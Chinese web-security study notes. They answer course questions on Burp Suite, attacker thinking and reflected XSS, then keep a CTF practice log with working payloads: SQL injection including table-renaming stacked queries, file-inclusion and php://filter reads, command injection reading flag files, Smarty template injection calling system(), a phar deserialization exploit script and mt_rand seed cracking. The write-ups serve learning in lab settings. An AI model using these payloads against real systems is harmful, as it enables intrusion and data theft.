## 1.本视频一开始介绍了哪两个工具，他们的作用分别是什么？为什么作者会推荐firefox，它的优点是什么？（5分）

Burp Prox:监控HTTP和HTTPs流量，修改重放请求等

Firefox:允许你在浏览器设置代理，而不是在系统设置

推荐firefox的原因:可以查看你想查看的流量，操作cookie,浏览DOm等


## 2.本视频中体现了哪些攻防上的哲学观点？作者希望你养成什么样的思维？这些思维在帮助你挖掘漏洞的时候有什么帮助？结合你的经历与视频内容谈谈你的看法。（10分）


攻防上的观点:不像防守者那样思考，要向攻击者一样，知道攻击者如何执行目标,如何思考。

思维:攻击者和防御者负担之间的不平衡，防御者需要找出每个错误，而攻击者只需要找处一小部分，攻击者比防御者更简单，将永远不会发现每个错误。注意专注于你想打破的一切，需要确定高风险区域，因此

```

<?php
if(isset($_GET[ ' name ' ])){
echo "<h1>Hello {$_GET['name']} !</h1>";
}
?>
<form method="GET">
Enter your name: <input type="input" name="name"><br>
<input type=" submit">

```

php代码属于服务端,html属于客户端

客户端通过get传递name参数来控制代码

会造成服务端弹窗，但是不会造成实质性的影响,不过可以通过弹窗诱导用户访问恶意链接，造成危害。恶意代码并不能保存在目标网站，所以是反射型xss。

### 如何攻击:

1.窃取cookies，读取目标网站的cookie发送到黑客的服务器上

2.读取用户未公开的资料，如果：邮件列表或者内容、系统的客户资料，联系人列表等等。它可以获取用户的联系人列表，然后向联系人发送虚假诈骗信息，可以删除用户的日志等等，有时候还和其他攻击方式同时实 施比如SQL注入攻击服务器和数据库、Click劫持、相对链接劫持等实施钓鱼，它带来的危害是巨大的，是web安全的头号大敌。
3.


### 防御:

1.在表单提交或者url参数传递前，对需要的参数进行过滤

2.过滤用户输入的 检查用户输入的内容中是否有非法内容。如<>（尖括号）、”（引号）、 ‘（单引号）、%（百分比符号）、;（分号）、()（括号）、&（& 符号）、+（加号）等。、严格控制输出

可以利用下面这些函数对出现xss漏洞的参数进行过滤

（1）htmlspecialchars() 函数,用于转义处理在页面上显示的文本。

（2）htmlentities() 函数,用于转义处理在页面上显示的文本。

（3）strip_tags() 函数,过滤掉输入、输出里面的恶意标签。

（4）header() 函数,使用header("Content-type:application/json"); 用于控制 json 数据的头部，不用于浏览。

（5）urlencode() 函数,用于输出处理字符型参数带入页面链接中。

（6）intval() 函数用于处理数值型参数输出页面中。

（7）自定义函数,在大多情况下，要使用一些常用的 html 标签，以美化页面显示，如留言、小纸条。那么在这样的情况下，要采用白名单的方法使用合法的标签显示，过滤掉非法的字符。



### 刷题记录:

#### [HCTF 2018]WarmUp
考察点:1.代码审计
    2.任意文件包含
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
            if (in_array($page, $whitelist)) {
                return true;
            }
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }
    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?> 

```
index.php?file=hint.php?../../../../../ffffllllaaaagggg

```
#### [极客大挑战 2019]EasySQL
考察点:sql注入之万能密码
图片: https://uploader.shimo.im/f/fHYh1XRYQDRo4VmD.png
sql注入题目使用万能密码登录获得flag
check.php?username=cl4y&password=1'or'1'='1 
图片: https://uploader.shimo.im/f/ptdsTKh5mcRNr4gr.png

#### [强网杯 2019]随便注
考察点:1.堆叠注入
           2.预处理语句
方法:常规:1.堆叠注入
        2.预处理语句
        3.handler
?inject=1%27%3B+show+columns+from+%601919810931114514%60%3B#
图片: https://uploader.shimo.im/f/xGwX3AoF1sc7N7tq.png
改表

```
0';rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#

1' or '1'='1

```
#### [极客大挑战 2019]Havefun

```

                <!--
        $cat=$_GET['cat'];
        echo $cat;
        if($cat=='dog'){
            echo 'Syc{cat_cat_cat_cat}';
        }
        
```
注释中的源码,让cat=dog  flag就莫名的出了。。。
?cat=dog
#### [SUCTF 2019]EasySQL

#### [ACTF2020 新生赛]Include
考察点:文件包含漏洞
图片: https://uploader.shimo.im/f/xzSvAf2PCGAwVcW3.png
直接用伪协议读取
?file=php://filter/convert.base64-encode/resource=flag.php
[极客大挑战 2019]Secret File
图片: https://uploader.shimo.im/f/SbGK46C5yBDq5KYC.png
图片: https://uploader.shimo.im/f/6PLm98UksiEvVZil.png

```
<html>
    <title>secret</title>
    <meta charset="UTF-8">
<?php
    highlight_file(__FILE__);
    error_reporting(0);
    $file=$_GET['file'];
    if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){
        echo "Oh no!";
        exit();
    }
    include($file); 
//flag放在了flag.php里
?>
```

```
secr3t.php?file=php://filter/convert.base64-encode/resource=flag.php

```

#### [ACTF2020 新生赛]Exec
考察点:简单的命令执行

```
127.0.0.1;cat /f*
128.
``` 
图片: https://uploader.shimo.im/f/QFN8VHS7kcmYeQFF.png

#### [GXYCTF2019]Ping Ping Ping
?ip=1;a=g;cat$IFS$1fla$a.php;

2021/4/16
#### [CISCN2019 华东南赛区]Web11
Build With Smarty !
Smarty是一个PHP下的网页模板系统。Smarty基本上是一种为了将不同考量的事情分离而推出的工具，这对某些应用程序是一种共通性设计策略。
根据提示在X-Forward-For处存在注入
图片: https://uploader.shimo.im/f/PIxS8IqgeZEWTHNz.png
输入
{$smarty.version}
判断是否为smarty注入
图片: https://uploader.shimo.im/f/lbuLIfHuM1x4j1fk.png
{if phpinfo()}{/if}  返回phpinfo
图片: https://uploader.shimo.im/f/14HO2ynWp4PuyDqe.png
{if system('cat ../../../flag')}{/if}
图片: https://uploader.shimo.im/f/0H2OrzkOTrqgELzR.png

2020/4/18

#### [CISCN2019 华北赛区 Day1 Web1]Dropbox
考察点:任意文件下载
    phar反序列化
下载得到的源码

```
#index.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>

<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>

<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```
```
#class.php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {
        array_push($this->funcs, $func);
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```
```
#delete.php

?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>

```
图片: https://uploader.shimo.im/f/z7e1xTlx06NQ66bi.png


图片: https://uploader.shimo.im/f/ehtbIds6W9BhwvJG.png

图片: https://uploader.shimo.im/f/dg8wEZTT3K7JLMB2.png
exp:

```
<?php

class User {
    public $db;
}

class File {
    public $filename;
}
class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct() {
        $file = new File();
        $file->filename = '/flag.txt';
        $this->files = array($file);
        $this->results = array();
        $this->funcs = array();
    }
}

@unlink("phar.phar");
$phar = new Phar("phar.phar"); //后缀名必须为phar

$phar->startBuffering();

$phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub

$o = new User();
$o->db = new FileList();

$phar->setMetadata($o); //将自定义的meta-data存入manifest
$phar->addFromString("exp.txt", "test"); //添加要压缩的文件
//签名自动计算
$phar->stopBuffering();
?> 
```
```
File类中的close方法会获取文件内容，如果能触发该方法，就有可能获取flag。
503
User类中存在close方法，并且该方法在对象销毁时执行。
504
同时FileList类中存在call魔术方法，并且类没有close方法。如果一个Filelist对象调用了close()方法，根据call方法的代码可以知道，文件的close方法会被执行，就可能拿到flag。
505
根据以上三条线索，梳理一下可以得出结论:
506
如果能创建一个user的对象，其db变量是一个FileList对象，对象中的文件名为flag的位置。这样的话，当user对象销毁时，db变量的close方法被执行；而db变量没有close方法，这样就会触发call魔术方法，进而变成了执行File对象的close方法。通过分析FileList类的析构方法可以知道，close方法执行后存在results变量里的结果会加入到table变量中被打印出来，也就是flag会被打印出来
```
https://www.cnblogs.com/kevinbruce656/p/11316070.html
https://xz.aliyun.com/t/2715

#### [BSidesCF 2019]Futurella
查看源代码即可得到flag
图片: https://uploader.shimo.im/f/kO5rcpLtxFOKbBq3.png
[GWCTF 2019]枯燥的抽奖
考察点:php伪随机数漏洞
前言:
PHP的mt_rand函数作为一个随机数生成工具在程序中被广泛使用，但是大家都忽略了一个事实，mt_rand生成的随机数不是一个真正的随机数，而是一个伪随机数，不能应用于生成安全令牌、核心加解密key等等，所以很多知名程序都出现过对mt_rand函数的错误使用而导致的安全问题。php_mt_seed是一个破解mt_rand函数种子的工具，对它应用场景的深刻理解和应用能极大的提升漏洞发现的可能和利用的成功率。本文将详细介绍PHP mt_rand函数的安全问题及php_mt_seed应用场景。

mt_rand就是一个伪随机数生成函数，它由可确定的函数，通过一个种子产生的伪随机数。这意味着：如果知道了种子，或者已经产生的随机数，都可能获得接下来随机数序列的信息（可预测性）。
查看源代码看到check.php

```
vrhzBygDyx
<?php
#这不是抽奖程序的源代码！不许看！
header("Content-Type: text/html;charset=utf-8");
session_start();
if(!isset($_SESSION['seed'])){
$_SESSION['seed']=rand(0,999999999);
}
mt_srand($_SESSION['seed']);
$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
$str_show = substr($str, 0, 10);
echo "<p id='p1'>".$str_show."</p>";

if(isset($_POST['num'])){
    if($_POST['num']===$str){x
        echo "<p id=flag>抽奖，就是那么枯燥且无味，给你flag{xxxxxxxxx}</p>";
    }
    else{
        echo "<p id=flag>没抽中哦，再试试吧</p>";
    }
}
show_source("check.php"); 

```
将字母换原为生成的伪随机数。

```
str1='abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='vrhzBygDyx'
      
str3 = str1[::-1]
length = len(str2)
res=''
for i in range(len(str2)):  
    for j in range(len(str1)):
        if str2[i] == str1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '
            break
print(res)
```
利用php_mt_seed生成种子
图片: https://uploader.shimo.im/f/TeKuIWIkXNr2BRr3.png

利用生成的种子生成序列提交即可获得flag

```
<?php
mt_srand(797432830);


$str_long1 = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
$str='';
$len1=20;
for ( $i = 0; $i < $len1; $i++ ){
    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       
}
echo $str;


?>

```

图片: https://uploader.shimo.im/f/BBmV6Qn9Rwzu6z27.png

#### [MRCTF2020]套娃
考点:1.代码审计
  2.伪协议
 3.绕过技巧
 4.client-ip
```
$query = $_SERVER['QUERY_STRING'];
	
	if( substr_count($query, '_') !== 0 || substr_count($query, '%5f') != 0 ){
	die('Y0u are So cutE!');
	}
	if($_GET['b_u_p_t'] !== '23333' && preg_match('/^23333$/', $_GET['b_u_p_t'])){
	echo "you are going to the next ~";
	}
  
```
使用.可绕过_,preg_match没有/m，因此用%0a就可以了
?b.u.p.t=23333%0a
进入了下一关
图片: https://uploader.shimo.im/f/Q16pix1M9BlgOb5q.png
查看网页源代码有一段Jsfuck，Merak post提交获得源码

```
error_reporting(0); 
include 'takeip.php';
ini_set('open_basedir','.'); 
include 'flag.php';
if(isset($_POST['Merak'])){ 
    highlight_file(__FILE__); 
    die(); 
} 

function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
}
echo 'Local access only!'."<br/>";
$ip = getIp();
if($ip!='127.0.0.1')
echo "Sorry,you don't have permission!  Your ip is :".$ip;
if($ip === '127.0.0.1' && file_get_contents($_GET['2333']) === 'todat is a happy day' ){
echo "Your REQUEST is:".change($_GET['file']);
echo file_get_contents(change($_GET['file'])); }
?> 
```
绕过三个地方就可以得到flag
第一:ip=127.0.0.1,这个用client-ip就可以绕过
第二:file_get_contents($_GET['2333']) === 'todat is a happy day' ),使用data伪协议绕过，
?2333=data://text/plain,todat%20is%20a%20happy%20day
change函数这里使用了一个简单的算法

```
function change($v){ 
    $v = base64_decode($v); 
    $re = ''; 
    for($i=0;$i<strlen($v);$i++){ 
        $re .= chr ( ord ($v[$i]) + $i*2 ); 
    } 
    return $re; 
    
```
那我们就逆一下这个

```
<?php
$re = '';
function change($v)
{
    for ($i = 0; $i < strlen($v); $i++) {
        $re .= chr(ord($v[$i]) - $i * 2);
    }
    $re=base64_encode($re);
    return $re;
}
$a='flag.php';
echo change($a);

```
图片: https://uploader.shimo.im/f/dhl138dUqL2lCVwc.png

